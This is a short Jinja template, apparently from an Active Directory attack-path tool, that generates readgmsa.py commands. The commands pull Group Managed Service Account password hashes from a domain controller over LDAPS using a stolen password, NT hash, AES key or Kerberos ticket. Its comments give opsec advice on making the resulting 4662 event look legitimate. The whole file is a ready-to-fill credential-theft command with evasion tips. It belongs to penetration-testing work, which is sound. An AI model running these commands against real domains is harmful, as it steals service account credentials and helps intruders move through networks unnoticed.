{# The script readgmsa returns hashes #}
# Read GMSA passwords
# When abusing a GMSA that is already logged onto a system, you will have the same
# opsec considerations as when abusing a standard user logon (see HasSession).
# When retrieving the GMSA password from Active Directory, you may generate a 4662
# event on the Domain Controller; however, that event will likely perfectly resemble
# a legitimate event if you request the password from the same context as a computer
# account that is already authorized to read the GMSA password.
{% if parent.krb_auth %}
./tools/readgmsa.py '{{fqdn}}/{{parent.obj.name}}@{{dc_name}}' -use-ldaps -dc-ip {{dc_ip}} -k
{%- elif parent.secret_type == T_SECRET_NTHASH %}
./tools/readgmsa.py '{{fqdn}}/{{parent.obj.name}}@{{dc_ip}}' -use-ldaps -hashes :{{parent.secret|red}}
{%- elif parent.secret_type == T_SECRET_AESKEY %}
./tools/readgmsa.py '{{fqdn}}/{{parent.obj.name}}@{{dc_ip}}' -use-ldaps -k -aesKey {{parent.secret|red}}
{%- elif parent.secret_type == T_SECRET_PASSWORD %}
./tools/readgmsa.py '{{fqdn}}/{{parent.obj.name}}:{{parent.secret|red}}@{{dc_ip}}' -use-ldaps
{%- endif %}
